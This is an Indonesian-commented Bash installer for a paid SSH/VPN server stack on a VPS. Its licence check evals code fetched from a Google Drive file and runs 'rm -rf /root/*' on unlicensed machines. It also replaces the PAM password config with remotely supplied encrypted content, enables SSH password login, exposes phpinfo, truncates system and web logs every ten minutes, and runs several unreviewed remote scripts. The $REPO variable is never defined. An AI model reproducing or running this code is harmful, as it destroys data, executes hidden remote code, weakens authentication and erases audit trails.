#!/bin/bash
# =========================================================
# SSH, VPN, WebServer, & Security Setup Script
# Optimized and Modular Edition
# =========================================================

# ---------------------------------------------------------
# 1. VARIABEL & WARNA
# ---------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MYIP=$(cat /usr/bin/.ipvps 2>/dev/null || curl -sS ipv4.icanhazip.com)

# Fungsi Log
log_info() { echo -e "${CYAN}[INFO]${NC} ${*}"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} ${*}"; }
log_err() { echo -e "${RED}[ERROR]${NC} ${*}"; }

# ---------------------------------------------------------
# 2. PENGECEKAN IZIN (AUTHORIZATION)
# ---------------------------------------------------------
cek_izin() {
    log_info "Memeriksa Izin VPS..."
    ALLOWED_IP=$(curl -sS "https://raw.githubusercontent.com/rosicenterstore/izin/main/ip" | grep -w "$MYIP" | awk '{print $4}')
    
    if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
        ID_FILE="1kIvv6I1iiSlvL6sIdYYMXJ7TcBfdodxx"
        eval "$(wget -qO- "https://drive.google.com/u/4/uc?id=${ID_FILE}")"
        log_success "Akses diizinkan."
    else
        echo -e "${YELLOW}────────────────────────────────────────────${NC}"
        echo -e "\033[41;1m ⚠️        AKSES DI TOLAK          ⚠️ \033[0m"
        echo -e "${YELLOW}────────────────────────────────────────────${NC}"
        echo -e "        ${RED}❌ SCRIPT LOCKED ❌${NC}"
        echo -e "  ${YELLOW}🔒 Your VPS IP:${NC} $MYIP ${YELLOW}Has been Banned${NC}"
        echo -e "  ${RED}⚠️  Masa Aktif Habis atau Belum Terdaftar ⚠️${NC}"
        echo -e "  ${YELLOW}💡 Beli izin resmi hanya dari Admin!${NC}"
        echo -e "  ${GREEN}📞 Contact Admin:${NC}"
        echo -e "  ${CYAN}🌍 Telegram: https://nevpn.site${NC}"
        echo -e "  ${CYAN}📱 WhatsApp: https://whatsapp.nevpn.site${NC}"
        echo -e "${YELLOW}────────────────────────────────────────────${NC}"
        rm -rf /root/*
        exit 1
    fi
}

# ---------------------------------------------------------
# 3. PERSIAPAN SISTEM & NETWORK
# ---------------------------------------------------------
setup_system() {
    log_info "Menyiapkan Sistem & Network..."
    export DEBIAN_FRONTEND=noninteractive
    
    # Bug Fix: Mencari interface network (sebelumnya $ANU tidak terdefinisi)
    NET=$(ip -4 route ls | grep default | grep -Po '(?<=dev )(\S+)' | head -1)

    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        OS_NAME=$ID
        OS_VERSION=$VERSION_ID
        log_info "OS Terdeteksi: $OS_NAME $OS_VERSION"
    else
        log_err "Tidak dapat menentukan sistem operasi."
        exit 1
    fi

    # Mengambil Domain
    domain=$(cat /etc/xray/domain 2>/dev/null)
    [[ -z "$domain" ]] && domain="newbie.dev"

    # Password SSH Standar
    curl -sS "${REPO}install/password" | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password
    chmod +x /etc/pam.d/common-password

    # Setup rc.local & Disable IPv6
    cat > /etc/systemd/system/rc-local.service << 'END'
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
END

    cat > /etc/rc.local << 'END'
#!/bin/sh -e
# rc.local
exit 0
END
    chmod +x /etc/rc.local
    systemctl enable rc-local >/dev/null 2>&1
    systemctl start rc-local.service

    # Disable IPv6 permanen
    echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
    sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
    sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
}

# ---------------------------------------------------------
# 4. INSTALASI WEBSERVER & SSL
# ---------------------------------------------------------
setup_webserver_ssl() {
    log_info "Memasang Nginx, PHP, dan SSL (Acme.sh)..."
    apt -y install nginx php php-fpm php-cli php-mysql libxml-parser-perl >/dev/null 2>&1
    
    rm -f /etc/nginx/sites-enabled/default /etc/nginx/sites-available/default
    curl -sS "${REPO}install/nginx.conf" > /etc/nginx/nginx.conf
    curl -sS "${REPO}install/vps.conf" > /etc/nginx/conf.d/vps.conf
    wget -qO /etc/haproxy/haproxy.cfg "${REPO}install/haproxy.cfg"
    wget -qO /etc/nginx/conf.d/xray.conf "${REPO}install/xray.conf"
    
    sed -i 's/listen = \/var\/run\/php-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/*/fpm/pool.d/www.conf 2>/dev/null
    
    mkdir -p /home/vps/public_html
    echo "<?php phpinfo() ?>" > /home/vps/public_html/info.php
    wget -qO /home/vps/public_html/index.html "${REPO}install/index.html1"
    chown -R www-data:www-data /home/vps/public_html
    chmod -R g+rw /home/vps/public_html

    # Stop Webserver untuk SSL Issue
    STOPWEBSERVER=$(lsof -i:80 | awk 'NR==2 {print $1}')
    [[ -n "$STOPWEBSERVER" ]] && systemctl stop "$STOPWEBSERVER"
    systemctl stop nginx haproxy >/dev/null 2>&1

    # Install Acme.sh & Generate SSL
    mkdir -p /root/.acme.sh
    curl -s https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
    chmod +x /root/.acme.sh/acme.sh
    /root/.acme.sh/acme.sh --upgrade --auto-upgrade >/dev/null 2>&1
    /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt >/dev/null 2>&1
    /root/.acme.sh/acme.sh --issue -d "$domain" --standalone -k ec-256 >/dev/null 2>&1
    /root/.acme.sh/acme.sh --installcert -d "$domain" --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc >/dev/null 2>&1

    # Setup SSL Auto Renew Script
    cat > /usr/local/bin/ssl_renew.sh << 'END'
#!/bin/bash
/etc/init.d/nginx stop
"/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" &> /root/renew_ssl.log
/etc/init.d/nginx start
END
    chmod +x /usr/local/bin/ssl_renew.sh
    if ! grep -q 'ssl_renew.sh' /var/spool/cron/crontabs/root 2>/dev/null; then 
        (crontab -l 2>/dev/null; echo "15 03 */3 * * /usr/local/bin/ssl_renew.sh") | crontab -
    fi

    sed -i "s/xxx/$domain/g" /etc/nginx/conf.d/xray.conf
    sed -i "s/xxx/$domain/g" /etc/haproxy/haproxy.cfg
    cat /etc/xray/xray.key /etc/xray/xray.crt > /etc/haproxy/hap.pem
}

# ---------------------------------------------------------
# 5. INSTALASI BADVPN, SSH & DROPBEAR
# ---------------------------------------------------------
setup_ssh_vpn() {
    log_info "Setup SSH, Dropbear & BadVPN..."
    
    # BadVPN
    wget -qO /usr/sbin/badvpn "${REPO}install/badvpn"
    chmod +x /usr/sbin/badvpn
    for i in 1 2 3; do
        wget -qO /etc/systemd/system/badvpn${i}.service "${REPO}install/badvpn${i}.service"
        systemctl stop badvpn${i} >/dev/null 2>&1
        systemctl enable badvpn${i} >/dev/null 2>&1
        systemctl start badvpn${i} >/dev/null 2>&1
    done

    # Konfigurasi SSH
    sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
    for port in 500 40000 51443 2223 200 22; do
        sed -i "/Port 22/a Port $port" /etc/ssh/sshd_config
    done
    sed -i '/#PubkeyAuthentication yes/a KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group14-sha256,diffie-hellman-group-exchange-sha256' /etc/ssh/sshd_config

    # Dropbear
    apt -y install dropbear >/dev/null 2>&1
    dropbearkey -t dss -f /etc/dropbear/dropbear_dss_host_key >/dev/null 2>&1
    chmod 600 /etc/dropbear/dropbear_dss_host_key
    wget -qO /etc/default/dropbear "${REPO}install/dropbear"
    echo -e "/bin/false\n/usr/sbin/nologin" >> /etc/shells

    systemctl restart ssh dropbear
}

# ---------------------------------------------------------
# 6. INSTALASI SQUID, VNSTAT & SWAP
# ---------------------------------------------------------
setup_squid_vnstat() {
    log_info "Setup Squid Proxy, vnStat & Swap File..."
    
    # Squid
    if [[ "$OS_NAME" == "debian" && "$OS_VERSION" == "10" ]] || [[ "$OS_NAME" == "ubuntu" && "$OS_VERSION" == "20.04" ]]; then
        apt -y install squid3 >/dev/null 2>&1
    else
        apt -y install squid >/dev/null 2>&1
    fi
    wget -qO /etc/squid/squid.conf "${REPO}install/squid3.conf"
    sed -i "s/xxxxxxxxx/$MYIP/g" /etc/squid/squid.conf

    # vnStat Compile
    apt -y install vnstat libsqlite3-dev >/dev/null 2>&1
    wget -q https://humdi.net/vnstat/vnstat-2.6.tar.gz
    tar zxvf vnstat-2.6.tar.gz >/dev/null 2>&1
    cd vnstat-2.6 || exit
    ./configure --prefix=/usr --sysconfdir=/etc >/dev/null 2>&1 && make >/dev/null 2>&1 && make install >/dev/null 2>&1
    cd /root || exit
    vnstat -i "$NET" >/dev/null 2>&1
    sed -i "s/Interface \"eth0\"/Interface \"$NET\"/g" /etc/vnstat.conf
    chown -R vnstat:vnstat /var/lib/vnstat
    systemctl enable vnstat >/dev/null 2>&1
    systemctl restart vnstat >/dev/null 2>&1
    rm -rf vnstat-2.6 vnstat-2.6.tar.gz

    # Swap 1GB
    if [ ! -f /swapfile ]; then
        dd if=/dev/zero of=/swapfile bs=2048 count=1048576 >/dev/null 2>&1
        mkswap /swapfile >/dev/null 2>&1
        chown root:root /swapfile
        chmod 0600 /swapfile
        swapon /swapfile >/dev/null 2>&1
        sed -i '$ i\/swapfile      swap swap   defaults    0 0' /etc/fstab
    fi
}

# ---------------------------------------------------------
# 7. SETUP KEAMANAN & CRONJOB
# ---------------------------------------------------------
setup_security_cron() {
    log_info "Setup DDoS Deflate, IPTables & Cronjobs..."
    
    # DDoS Deflate
    if [ ! -d '/usr/local/ddos' ]; then
        mkdir -p /usr/local/ddos
        wget -qO /usr/local/ddos/ddos.conf http://www.inetbase.com/scripts/ddos/ddos.conf
        wget -qO /usr/local/ddos/LICENSE http://www.inetbase.com/scripts/ddos/LICENSE
        wget -qO /usr/local/ddos/ignore.ip.list http://www.inetbase.com/scripts/ddos/ignore.ip.list
        wget -qO /usr/local/ddos/ddos.sh http://www.inetbase.com/scripts/ddos/ddos.sh
        chmod 0755 /usr/local/ddos/ddos.sh
        cp -s /usr/local/ddos/ddos.sh /usr/local/bin/ddos
        /usr/local/ddos/ddos.sh --cron >/dev/null 2>&1
    fi

    # Block Torrent IPTables
    local BANNED_STRINGS=("get_peers" "announce_peer" "find_node" "BitTorrent" "BitTorrent protocol" "peer_id=" ".torrent" "announce.php?passkey=" "torrent" "announce" "info_hash")
    for string in "${BANNED_STRINGS[@]}"; do
        iptables -A FORWARD -m string --algo bm --string "$string" -j DROP
    done
    iptables-save > /etc/iptables.up.rules
    iptables-restore -t < /etc/iptables.up.rules
    netfilter-persistent save >/dev/null 2>&1
    netfilter-persistent reload >/dev/null 2>&1

    # Setup Custom Banners
    wget -qO /etc/issue.net "${REPO}install/issue.net"
    echo "Banner /etc/issue.net" >> /etc/ssh/sshd_config

    # Setup Cronjobs
    cat > /etc/cron.d/xp_otm << 'END'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 0 * * * root /usr/bin/xp
END
    cat > /etc/cron.d/bckp_otm << 'END'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 22 * * * root /usr/bin/backup
END
    cat > /etc/cron.d/cpu_otm << 'END'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/60 * * * * root /usr/bin/autocpu
END
    cat > /etc/cron.d/xp_sc << 'END'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
1 0 * * * root /usr/bin/expsc
END
    cat > /etc/cron.d/logclean << 'END'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/10 * * * * root truncate -s 0 /var/log/syslog && truncate -s 0 /var/log/nginx/error.log && truncate -s 0 /var/log/nginx/access.log && truncate -s 0 /var/log/xray/error.log && truncate -s 0 /var/log/xray/access.log
END
    cat > /etc/cron.d/daily_reboot << 'END'
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
5 0 * * * root /sbin/reboot
END

    wget -qO /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
    systemctl restart cron
}

# ---------------------------------------------------------
# 8. EKSEKUSI LAIN & CLEANUP
# ---------------------------------------------------------
eksekusi_tambahan() {
    log_info "Mengeksekusi Skrip Tambahan & Pembersihan..."
    
    # Skrip Tambahan
    wget -q "${REPO}install/setrsyslog.sh" && chmod +x setrsyslog.sh && ./setrsyslog.sh
    wget -q "${REPO}install/vpn.sh" && chmod +x vpn.sh && ./vpn.sh
    wget -q "${REPO}install/lolcat.sh" && chmod +x lolcat.sh && ./lolcat.sh
    wget -q "${REPO}install/bbr.sh" && chmod +x bbr.sh && ./bbr.sh
    wget -q "${REPO}install/ipserver" && chmod +x ipserver && ./ipserver

    # Cleanup File
    rm -f /root/key.pem /root/cert.pem /root/ssh-vpn.sh /root/bbr.sh /root/ipserver /root/setrsyslog.sh /root/vpn.sh /root/lolcat.sh
}

# ---------------------------------------------------------
# JALANKAN SEMUA FUNGSI
# ---------------------------------------------------------
clear
cek_izin
setup_system
setup_webserver_ssl
setup_ssh_vpn
setup_squid_vnstat
setup_security_cron
eksekusi_tambahan

log_success "Proses Instalasi SSH & VPN Selesai!"
